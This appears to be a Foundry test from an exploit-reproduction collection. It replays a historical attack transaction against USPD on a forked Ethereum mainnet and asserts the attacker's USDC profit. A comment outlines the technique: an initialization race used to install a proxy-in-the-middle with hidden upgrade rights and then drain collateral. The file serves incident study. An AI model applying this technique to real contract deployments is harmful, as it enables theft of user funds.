// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

/*
    @KeyInfo
    - Total Lost: ~$1M
    - Attacker: 0x083379BDAC3E138cb0C7210e0282fbC466A3215A
    - Attack Tx: https://etherscan.io/tx/0xa7cab072bf0453301a0ab1b06c49a9405d115824fc617fb42cba9b70f3b893c2
    - Post-mortem: https://uspd.io/blog/cpimp-attack-postmortem

    A deployment-time initialization race let the attacker install a
    proxy-in-the-middle implementation. The CPIMP preserved normal forwarding
    while retaining hidden upgrade authority, later used to drain collateral.
*/

interface IERC20USPD {
    function balanceOf(
        address account
    ) external view returns (uint256);
}

contract USPDExploitTest is Test {
    bytes32 private constant ATTACK_TX = 0xa7cab072bf0453301a0ab1b06c49a9405d115824fc617fb42cba9b70f3b893c2;
    address private constant ATTACKER = 0x083379BDAC3E138cb0C7210e0282fbC466A3215A;
    IERC20USPD private constant USDC = IERC20USPD(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function setUp() public {
        vm.createSelectFork("mainnet", 23_941_342);
    }

    function testExploit() public {
        uint256 usdcBefore = USDC.balanceOf(ATTACKER);
        vm.transact(ATTACK_TX);
        uint256 usdcProfit = USDC.balanceOf(ATTACKER) - usdcBefore;

        emit log_named_decimal_uint("USDC profit component", usdcProfit, 6);
        assertEq(usdcProfit, 302_908.856746e6);
    }
}
